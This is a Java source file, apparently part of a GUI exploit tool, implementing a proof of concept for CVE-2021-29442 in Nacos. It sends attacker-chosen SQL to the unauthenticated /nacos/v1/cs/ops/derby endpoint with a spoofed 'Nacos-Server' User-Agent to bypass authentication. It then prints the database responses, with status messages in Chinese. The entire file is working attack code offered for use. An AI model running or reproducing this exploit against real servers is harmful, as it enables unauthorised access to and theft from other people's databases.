package nacos.poc;

import javafx.scene.control.TextArea;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.*;

public class Code_Cve_2021_29442 {

    private TextArea textArea = null;

    public TextArea getTextArea() {
        return textArea;
    }

    public void setTextArea(TextArea textArea) {
        this.textArea = textArea;
    }

    public void run(String url, String sql,TextArea textArea){
        // info 赋予全局变量
        setTextArea(textArea);
        // 1、尝试执行SQL语句
        execSql(url,sql);
    }
    public void runTest(String url, String sql){
        // info 赋予全局变量
        setTextArea(textArea);
        // 1、尝试执行SQL语句
        execSql(url,sql);
    }

    /**
     * 直接执行原生SQL语句
     * @param url
     * @param sql
     */
    private void execSql(String url, String sql) {

        try {
            // 设置 POST 请求的 URL 和请求体
            String path = "/nacos/v1/cs/ops/derby?sql=";
            // url // 问题处理
            URI baseUri = new URI(url);
            URI resultUri = baseUri.resolve(path);
            url = resultUri.toString() + sql;

            System.out.println(url);

            printInfo("[+] 尝试执行SQL语句");
            printInfo("[+] 访问地址为:" + url);

            // 创建 URL 对象
            URL apiUrl = new URL(url);

            // 打开连接
            HttpURLConnection connection = (HttpURLConnection) apiUrl.openConnection();

            // 设置请求方法为 GET
            connection.setRequestMethod("GET");

            // 启用输出流，并设置请求头
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("User-Agent","Nacos-Server");

            // 获取返回包信息
            StringBuilder response = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            // 获取JSON的code值
            JSONObject jsonResponse = new JSONObject(response.toString());
            int code = jsonResponse.getInt("code");

            System.out.println(code);
            if (code == 200){
                // 输出返回包信息
                printInfo("[+] SQL执行成功");
                printInfo("[+] 响应包:" + response.toString());
            } else if (code == 500) {
                printInfo("[-] SQL执行失败");
                printInfo("[-] 响应包:" + response.toString());
            } else {
                printInfo("[-] 访问失败");
                printInfo("[-] 响应包:" + response.toString());
            }
        }catch (Exception e){
            if (e instanceof ConnectException){
                printInfo("[-] 无法连接到服务器:"+e.getMessage());
                printInfo("[-]");
            } else if (e instanceof MalformedURLException) {
                printInfo("[-] URL格式不正确:"+e.getMessage());
                printInfo("[-]");
            }else {
                System.out.println(e.getMessage());
            }
        }
    }

    public void printInfo(String info){
        System.out.println(info);
        getTextArea().appendText(info + "\n");
    }
}
